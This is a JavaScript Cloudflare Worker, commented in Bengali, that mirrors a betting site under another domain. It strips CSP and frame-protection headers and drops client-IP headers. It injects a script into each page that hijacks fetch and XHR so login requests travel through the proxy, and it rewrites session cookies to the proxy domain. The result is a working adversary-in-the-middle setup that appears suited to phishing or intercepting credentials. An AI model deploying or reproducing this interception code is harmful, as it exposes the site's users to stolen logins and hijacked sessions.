export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    // ==========================================
    // ১. কাস্টম SVG ইন্টারসেপ্ট
    // ==========================================
    if (url.pathname.includes('gamex.689a2e64e46ee4d9cc7e.svg')) {
      const customSvg = `
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="none">
          <polygon points="15,0 100,0 100,100 0,100" fill="#56BAD9" />
        </svg>
      `;
      return new Response(customSvg, {
        headers: {
          "Content-Type": "image/svg+xml; charset=utf-8",
          "Access-Control-Allow-Origin": "*",
          "Cache-Control": "max-age=86400" 
        }
      });
    }

    const targetDomain = env.TARGET || "pori365.live";
    const proxyDomain = url.hostname;

    // ==========================================
    // ২. API ইন্টারসেপ্টর রুট (লগইনের জন্য)
    // ==========================================
    // ব্রাউজার যখন ইনজেক্ট করা স্ক্রিপ্টের মাধ্যমে এখানে API রিকোয়েস্ট পাঠাবে
    if (url.pathname.startsWith('/_api_proxy/')) {
      // আসল API URL বের করা (যেমন: https://trueexch.com:5018/v1/user/login)
      const targetApiUrlStr = request.url.replace(new RegExp(`^https?://${proxyDomain}/_api_proxy/`), '');
      
      // CORS Preflight ঠিক করা
      if (request.method === "OPTIONS") {
        return new Response(null, {
          headers: {
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Methods": "*",
            "Access-Control-Allow-Headers": "*",
            "Access-Control-Max-Age": "86400",
          }
        });
      }

      const apiReqHeaders = new Headers(request.headers);
      apiReqHeaders.delete('Host'); // Host হেডার মুছে দিচ্ছি যাতে স্বয়ংক্রিয়ভাবে বসে
      apiReqHeaders.set('Origin', `https://${targetDomain}`);
      apiReqHeaders.set('Referer', `https://${targetDomain}/`);

      // বডি/পেলোড মডিফাই করা (যদি থাকে)
      let reqBody = request.body;
      if (["POST", "PUT", "PATCH"].includes(request.method)) {
        let textBody = await request.text();
        // পেলোডের ভেতর থেকে ওয়ার্কারের ডোমেইন মুছে আসল ডোমেইন বসাচ্ছি
        textBody = textBody.replace(new RegExp(proxyDomain, 'g'), targetDomain);
        reqBody = textBody;
      }

      // মূল API সার্ভারে রিকোয়েস্ট পাঠানো
      let apiRes = await fetch(targetApiUrlStr, {
        method: request.method,
        headers: apiReqHeaders,
        body: reqBody,
        redirect: 'manual'
      });

      let apiResHeaders = new Headers(apiRes.headers);
      apiResHeaders.set("Access-Control-Allow-Origin", "*");
      
      // কুকি ডোমেইন ঠিক করা (লগইন ধরে রাখার জন্য অত্যন্ত গুরুত্বপূর্ণ)
      const setCookie = apiResHeaders.get("Set-Cookie");
      if (setCookie) {
        let updatedCookie = setCookie.replace(/domain=[^;]+/gi, `domain=${proxyDomain}`);
        apiResHeaders.set("Set-Cookie", updatedCookie);
      }

      return new Response(apiRes.body, {
        status: apiRes.status,
        headers: apiResHeaders
      });
    }

    // ==========================================
    // ৩. মূল ওয়েবসাইটের রিভার্স প্রক্সি
    // ==========================================
    const targetUrl = new URL(request.url);
    targetUrl.hostname = targetDomain;
    targetUrl.protocol = 'https:';

    const reqHeaders = new Headers(request.headers);
    reqHeaders.set("Host", targetDomain);
    reqHeaders.set("Origin", `https://${targetDomain}`);
    reqHeaders.set("Referer", `https://${targetDomain}/`);
    reqHeaders.delete("cf-connecting-ip");
    reqHeaders.delete("x-real-ip");

    let response = await fetch(targetUrl.toString(), {
      method: request.method,
      headers: reqHeaders,
      body: request.body,
      redirect: 'manual'
    });

    let resHeaders = new Headers(response.headers);
    resHeaders.set("Access-Control-Allow-Origin", "*");
    resHeaders.delete("content-security-policy");
    resHeaders.delete("x-frame-options");

    const contentType = resHeaders.get("Content-Type") || "";

    // ==========================================
    // ৪. HTML এর ভেতর জাদুকরী স্ক্রিপ্ট ইনজেকশন
    // ==========================================
    if (contentType.includes("text/html")) {
      let text = await response.text();

      // এই স্ক্রিপ্টটি ব্রাউজারের fetch এবং XHR কে হ্যাক করে লগইন রিকোয়েস্ট ওয়ার্কারের দিকে ঘুরিয়ে দেবে
      const interceptorScript = `
        <script>
          (function() {
            const proxyDom = "${proxyDomain}";
            const targetDom = "${targetDomain}";
            
            // Override Fetch API
            const origFetch = window.fetch;
            window.fetch = async function() {
              let args = Array.prototype.slice.call(arguments);
              
              if (typeof args[0] === 'string' && args[0].includes('trueexch.com')) {
                args[0] = 'https://' + proxyDom + '/_api_proxy/' + args[0];
              } else if (args[0] instanceof Request && args[0].url.includes('trueexch.com')) {
                args[0] = new Request('https://' + proxyDom + '/_api_proxy/' + args[0].url, args[0]);
              }
              
              // Payload Modification
              if (args[1] && args[1].body && typeof args[1].body === 'string') {
                args[1].body = args[1].body.split(proxyDom).join(targetDom);
              }
              return origFetch.apply(this, args);
            };

            // Override XMLHttpRequest (XHR)
            const origOpen = XMLHttpRequest.prototype.open;
            XMLHttpRequest.prototype.open = function(method, url) {
              if (typeof url === 'string' && url.includes('trueexch.com')) {
                url = 'https://' + proxyDom + '/_api_proxy/' + url;
              }
              this._url = url;
              return origOpen.apply(this, arguments);
            };

            const origSend = XMLHttpRequest.prototype.send;
            XMLHttpRequest.prototype.send = function(body) {
              if (body && typeof body === 'string') {
                body = body.split(proxyDom).join(targetDom);
              }
              return origSend.call(this, body);
            };
          })();
        </script>
      `;

      // <head> ট্যাগের ঠিক পরেই স্ক্রিপ্টটি বসিয়ে দেওয়া হচ্ছে
      text = text.replace('<head>', '<head>' + interceptorScript);
      
      // ডোমেইন নেম রিপ্লেস করা
      text = text.replace(new RegExp(targetDomain, 'g'), proxyDomain);
      text = text.replace(new RegExp(`http://${proxyDomain}`, 'g'), `https://${proxyDomain}`);

      return new Response(text, { status: response.status, headers: resHeaders });
    } 
    
    // JS বা CSS ফাইলের জন্য
    if (contentType.includes("application/javascript") || contentType.includes("text/css")) {
      let text = await response.text();
      text = text.replace(new RegExp(targetDomain, 'g'), proxyDomain);
      text = text.replace(new RegExp(`http://${proxyDomain}`, 'g'), `https://${proxyDomain}`);
      return new Response(text, { status: response.status, headers: resHeaders });
    }

    // ইমেজ বা অন্যান্য ফাইলের জন্য সরাসরি রেসপন্স
    return new Response(response.body, { status: response.status, headers: resHeaders });
  }
};
